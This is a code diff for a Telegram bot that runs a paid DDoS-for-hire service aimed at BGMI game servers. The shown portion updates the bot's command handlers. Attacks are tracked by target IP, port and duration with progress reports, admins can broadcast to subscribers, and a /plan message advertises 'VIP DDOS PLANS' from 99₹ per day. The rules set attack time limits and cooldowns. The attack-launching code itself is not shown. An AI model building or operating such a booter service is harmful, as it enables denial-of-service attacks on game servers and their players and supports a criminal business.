+        # Set cooldown for non-admin users
+        if user_id not in admin_owner:
+            attack_cooldown[user_id] = datetime.now(IST) + timedelta(minutes=5)
+
+    except ValueError:
+        bot.reply_to(message, "❌ 𝗘𝗿𝗿𝗼𝗿: 𝗣𝗼𝗿𝘁 𝗮𝗻𝗱 𝘁𝗶𝗺𝗲 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗻𝘂𝗺𝗯𝗲𝗿𝘀.")
+
+
+# Previous attack handling code remains the same
+ongoing_attacks = []
 
 @bot.message_handler(commands=['status'])
 def show_status(message):
     user_id = str(message.chat.id)
-    if user_id in admin_owner or user_id in read_users():
-        response = "Ongoing Attacks:\n\n"
-        
-        total_attacks = 0
-        for user_id, attacks in ongoing_attacks.items():
-            if attacks:
-                total_attacks += len(attacks)
-                for attack in attacks:
-                    response += (f"User: {attack['user']}\nTarget: {attack['target']}\n"
-                               f"Port: {attack['port']}\nTime: {attack['time']} seconds\n"
-                               f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n")
-        
-        if total_attacks == 0:
-            response += "No ongoing attacks currently."
-        
-        bot.reply_to(message, response)
-    else:
-        bot.reply_to(message, "You are not authorized to view the status.")
-
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_id = str(message.chat.id)
     users = read_users()
-    user_name = message.from_user.first_name
     
-    if user_id in admin_owner or user_id in users:
-        response = f"""Welcome to Our BOT, {user_name}
-🔰 Run This Command : /help
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 BUY / OWNER - @its_MATRIX_King
+    # Check if user is authorized
+    if user_id not in admin_owner and user_id not in users:
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
+        return
 
-✅ You are an authorized user with full access."""
+    if not ongoing_attacks:
+        bot.reply_to(message, "📊 𝗦𝘁𝗮𝘁𝘂𝘀: No ongoing attacks")
+        return
+
+    current_time = datetime.now(IST)
+    
+    # Different views for admin and regular users
+    if user_id in admin_owner:
+        # Detailed admin view
+        response = "📊 𝗗𝗲𝘁𝗮𝗶𝗹𝗲𝗱 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝘁𝘂𝘀:\n\n"
+        for attack in ongoing_attacks:
+            elapsed = (current_time - attack['start_time']).total_seconds()
+            remaining = max(0, attack['time'] - int(elapsed))
+            progress = min(100, (elapsed / attack['time']) * 100)
+            
+            response += (
+                f"👤 𝗨𝘀𝗲𝗿: @{attack['user']} (ID: {attack['user_id']})\n"
+                f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {attack['target']}\n"
+                f"🔌 𝗣𝗼𝗿𝘁: {attack['port']}\n"
+                f"⏱️ 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲: {attack['time']} seconds\n"
+                f"⌛️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining} seconds\n"
+                f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {progress:.1f}%\n"
+                f"📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')} IST\n"
+                f"🔄 𝗘𝗹𝗮𝗽𝘀𝗲𝗱: {int(elapsed)} seconds\n"
+                "━━━━━━━━━━━━━━━\n"
+            )
     else:
-        response = f"""⚠️ Unauthorized Access!
-
-Dear {user_name},
-You are not authorized to use this bot.
-         /"\
-        |\./|
-        |   |
-        |   |
-        |>*<|
-        |   |
-     /'\|   |/'\
- /'\|   |   |   |
-|   |   |   |   |\
-|   |   |   |   |  \
-| *   *   *   * |>  >  We are Watching you
-|                  /
- |               /
-  |            /
-   \          |
-    |         |
-Please contact @its_MATRIX_King to purchase access.
-
-🔰 Run /plan For Our Details
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 Owner - @its_MATRIX_King"""
+        # Simple user view
+        response = "📊 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝘁𝘂𝘀:\n\n"
+        for attack in ongoing_attacks:
+            elapsed = (current_time - attack['start_time']).total_seconds()
+            remaining = max(0, attack['time'] - int(elapsed))
+            progress = min(100, (elapsed / attack['time']) * 100)
+            
+            response += (
+                f"⏳ 𝗦𝘁𝗮𝘁𝘂𝘀: Attack in Progress\n"
+                f"⌛️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining} seconds\n"
+                f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {progress:.1f}%\n"
+                "━━━━━━━━━━━━━━━\n"
+                "⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁\n"
+                "𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵\n"
+            )
 
     bot.reply_to(message, response)
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_message(message):
+    user_id = str(message.chat.id)
+    if user_id not in admin_id:
+        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: Admin only command")
+        return
+
+    args = message.text.split(maxsplit=1)
+    if len(args) != 2:
+        bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /broadcast <message>")
+        return
+
+    broadcast_text = args[1]
+    try:
+        # Get all active users
+        cursor.execute("""
+            SELECT user_id, username 
+            FROM users 
+            WHERE expiration > NOW()
+            ORDER BY username
+        """)
+        users = cursor.fetchall()
+
+        if not users:
+            bot.reply_to(message, "❌ No active users found to broadcast to.")
+            return
+
+        # Track successful and failed broadcasts
+        success_count = 0
+        failed_users = []
+
+        # Send message to each user
+        for user_id, username in users:
+            try:
+                formatted_message = f"""
+📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘
+
+{broadcast_text}
+
+━━━━━━━━━━━━━━━
+𝗦𝗲𝗻𝘁 𝗯𝘆: @{message.from_user.username}
+𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
+"""
+                bot.send_message(user_id, formatted_message)
+                success_count += 1
+                time.sleep(0.1)  # Prevent flooding
+            except Exception as e:
+                failed_users.append(f"@{username}")
+                logging.error(f"Failed to send broadcast to {username} ({user_id}): {e}")
+
+        # Send summary to admin
+        summary = f"""
+✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗦𝘂𝗺𝗺𝗮𝗿𝘆:
+
+📨 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {len(users)}
+✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹: {success_count}
+❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {len(failed_users)}
+"""
+        if failed_users:
+            summary += f"\n❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘂𝘀𝗲𝗿𝘀:\n" + "\n".join(failed_users)
+
+        bot.reply_to(message, summary)
+
+    except Exception as e:
+        logging.error(f"Broadcast error: {e}")
+        bot.reply_to(message, f"❌ Error during broadcast: {str(e)}")
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
     try:
         user_id = str(message.chat.id)
-        users = read_users()
+        help_text = '''
+📚 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
 
-        if user_id in admin_owner or user_id in users:
-            # Help text for authorized users
-            if user_id in admin_owner:
-                help_text = '''✅ ADMIN COMMANDS:
+🎯 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
+• /matrix - 𝗘𝘅𝗲𝗰𝘂𝘁𝗲 𝗮𝘁𝘁𝗮𝗰𝗸
+• /status - 𝗖𝗵𝗲𝗰𝗸 𝗮𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝘁𝘂𝘀
+• /plan - 𝗩𝗶𝗲𝘄 𝗽𝗿𝗶𝗰𝗶𝗻𝗴 𝗽𝗹𝗮𝗻𝘀
+• /rulesanduse - 𝗩𝗶𝗲𝘄 𝗿𝘂𝗹𝗲𝘀
+• /redeem - 𝗥𝗲𝗱𝗲𝗲𝗺 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆
+'''
+        if user_id in admin_id:
+            help_text += '''
+👑 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
+• /key - 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆
+• /allkeys - 𝗩𝗶𝗲𝘄 𝗮𝗹𝗹 𝗸𝗲𝘆𝘀
+• /allusers - 𝗩𝗶𝗲𝘄 𝗮𝗰𝘁𝗶𝘃𝗲 𝘂𝘀𝗲𝗿𝘀
+• /broadcast - 𝗦𝗲𝗻𝗱 𝗺𝗮𝘀𝘀 𝗺𝗲𝘀𝘀𝗮𝗴𝗲
+• /remove - 𝗥𝗲𝗺𝗼𝘃𝗲 𝗮 𝗸𝗲𝘆
+'''
+        help_text += '''
+📢 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:
+➡️ @MATRIX_CHEATS
 
-🔰 /matrix - Execute BGMI server attack
-🔰 /status - View ongoing attack details
-🔰 /add - Add new user with time limit
-🔰 /remove - Remove user access
-🔰 /allusers - List all authorized users
-🔰 /broadcast - Send message to all users
-🔰 /rulesanduse - View usage guidelines
-🔰 /plan - Check available plans
-🔰 /id - Get your user ID
-
-JOIN CHANNEL - @MATRIX_CHEATS
-OWNER - @its_MATRIX_King'''
-            else:
-                help_text = '''✅ USER COMMANDS:
-
-🔰 /matrix - Execute BGMI server attack
-🔰 /status - View ongoing attack details
-🔰 /rulesanduse - View usage guidelines
-🔰 /plan - Check available plans
-🔰 /id - Get your user ID
-
-JOIN CHANNEL - @MATRIX_CHEATS
-OWNER - @its_MATRIX_King'''
-        else:
-            help_text = """⚠️ Unauthorized Access!
-
-Dear {user_name},
-You are not authorized to use this bot.
-         /"\
-        |\./|
-        |   |
-        |   |
-        |>*<|
-        |   |
-     /'\|   |/'\
- /'\|   |   |   |
-|   |   |   |   |\
-|   |   |   |   |  \
-| *   *   *   * |>  >  We are Watching you
-|                  /
- |               /
-  |            /
-   \          |
-    |         |
-Please contact @its_MATRIX_King to purchase access.
-
-🔰 Run /plan For Our Details
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 Owner - @its_MATRIX_King"""
-
+👨‍💻 𝗢𝗪𝗡𝗘𝗥/𝗕𝗨𝗬:
+➡️ @its_MATRIX_King
+'''
         bot.reply_to(message, help_text)
-    
     except Exception as e:
         logging.error(f"Error in /help command: {e}")
-        bot.reply_to(message, "An error occurred while processing your request.")
+        bot.reply_to(message, "❌ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
+    
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    user_name = message.from_user.first_name
+    response = f'''
+👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {user_name}!
+
+🚀 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝗰𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝗼𝘂𝗿 𝘀𝗲𝗿𝘃𝗶𝗰𝗲𝘀!
+📝 𝗧𝘆𝗽𝗲 /help 𝘁𝗼 𝘃𝗶𝗲𝘄 𝗮𝗹𝗹 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀
+
+📢 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:
+➡️ @MATRIX_CHEATS
+
+👨‍💻 𝗢𝗪𝗡𝗘𝗥/𝗕𝗨𝗬:
+➡️ @its_MATRIX_King
+'''
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rulesanduse'])
 def welcome_rules(message):
     user_id = str(message.chat.id)
     users = read_users()
-    user_name = message.from_user.first_name
     
-    if user_id in admin_owner or user_id in users:
-        response = f'''✅ Rules & Usage Guidelines for {user_name}:
+    if user_id in users or user_id in admin_id:
+        user_name = message.from_user.first_name
+        response = f'''
+📜 𝗥𝗨𝗟𝗘𝗦 & 𝗚𝗨𝗜𝗗𝗘𝗟𝗜𝗡𝗘𝗦
 
-⚠️ IMPORTANT RULES:
-1. Maximum attack time is 180 seconds
-2. Use Multiple Attacks Like 180+180
-3. Before First 120 Seconds Attack Use Another Attack
-4. Do not abuse the service
+👋 𝗛𝗲𝗹𝗹𝗼 {user_name}, 𝗣𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝗿𝘂𝗹𝗲𝘀:
 
-🔰 USAGE TIPS:
-• Use correct port numbers
-• Verify target before attack
-• Follow cooldown periods
-• Report any issues to admin
+⏱️ 𝗧𝗶𝗺𝗲 𝗟𝗶𝗺𝗶𝘁:
+• 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 200 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗽𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸
+• 5 𝗺𝗶𝗻𝘂𝘁𝗲𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 𝗮𝘁𝘁𝗮𝗰𝗸𝘀
 
-JOIN CHANNEL - @MATRIX_CHEATS
-OWNER - @its_MATRIX_King'''
+⚠️ 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁:
+• 𝗔𝗹𝘄𝗮𝘆𝘀 𝗰𝗵𝗲𝗰𝗸 /status 𝗯𝗲𝗳𝗼𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸
+• 𝗪𝗮𝗶𝘁 𝗳𝗼𝗿 𝗼𝗻𝗴𝗼𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵
+
+💡 𝗧𝗶𝗽𝘀:
+• 𝗨𝘀𝗲 /matrix <𝘁𝗮𝗿𝗴𝗲𝘁> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>
+• 𝗞𝗲𝗲𝗽 𝘆𝗼𝘂𝗿 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘀𝗮𝗳𝗲
+
+📢 𝗦𝘁𝗮𝘆 𝗨𝗽𝗱𝗮𝘁𝗲𝗱:
+➡️ @MATRIX_CHEATS
+
+💫 𝗡𝗲𝗲𝗱 𝗛𝗲𝗹𝗽?
+➡️ @its_MATRIX_King
+'''
+        bot.reply_to(message, response)
     else:
-        response = f"""⚠️ Unauthorized Access!
-
-Dear {user_name},
-You are not authorized to use this bot.
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣀⣤⣤⣄⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣴⣿⣿⣿⣿⣿⣿⣦⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢀⣾⣿⣿⠟⣻⣿⣿⡟⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢸⣿⣿⣿⣼⣿⣿⣿⣿⣼⡻⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢸⣿⣿⣿⣌⢻⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢸⣿⣿⣿⣿⣦⣙⢿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢸⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣤⣀⠀⠀⠠⣶⡶⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠈⢿⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣯⣿⣿⣶⣴⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠉⠉⣿⣯⣝⣋⡛⠟⠿⠿⠿⠿⠿⣿⡿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢃⣤⣴⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠘⢿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⡄⠀⠈⠛⠿⠿⠿⠿⠟⠋⠁⢐⣿⣿⣟⣻⣿⣟⢿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠈⣿⣿⣿⣷⣬⣍⣛⣛⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣘⣿⣿⣿⣿⣿⣿⣎⢿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣭⣿⣷⡀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣩⣿⣿⣿⣿⣿⣿⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠘⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣻⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣦⣭⣝⡛⠿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣷⣶⣾⣿⡍⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⣿⣿⣿⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⣄⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-Please contact @its_MATRIX_King to purchase access.
-
-🔰 Run /plan For Our Details
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 Owner - @its_MATRIX_King"""
-    bot.reply_to(message, response)
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''💰 VIP PLANS & PRICING
+    response = f'''
+🌟 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 𝗣𝗟𝗔𝗡𝗦 🌟
 
-Dear {user_name},
-Contact @its_MATRIX_King for current plans and pricing.
+👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗣𝗟𝗔𝗡𝗦:
+━━━━━━━━━━━━━━━
+⚡️ 1 𝗗𝗔𝗬 - 99₹
+⚡️ 7 𝗗𝗔𝗬𝗦 - 299₹
+⚡️ 30 𝗗𝗔𝗬𝗦 - 499₹
+⚡️ 1 𝗦𝗘𝗔𝗦𝗢𝗡 - 749₹
 
-✨ BENEFITS:
-• Premium Support
-• 24*7 Running
-• Priority Access
-• Extended Features
-• Reliable Service
+💫 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦:
+• 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗔𝘁𝘁𝗮𝗰𝗸𝘀
+• 24/7 𝗦𝘂𝗽𝗽𝗼𝗿𝘁
+• 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗦𝗲𝗿𝘃𝗲𝗿𝘀
+• 𝗛𝗶𝗴𝗵 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗥𝗮𝘁𝗲
 
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 OWNER - @its_MATRIX_King'''
-    
+💎 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗡𝗢𝗪:
+➡️ @its_MATRIX_King
+
+📢 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:
+➡️ @MATRIX_CHEATS
+
+⏰ 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗜𝗠𝗘 𝗢𝗙𝗙𝗘𝗥
+'''
     bot.reply_to(message, response)
-
-@bot.message_handler(commands=['id'])
-def show_user_id(message):
-    user_id = str(message.chat.id)
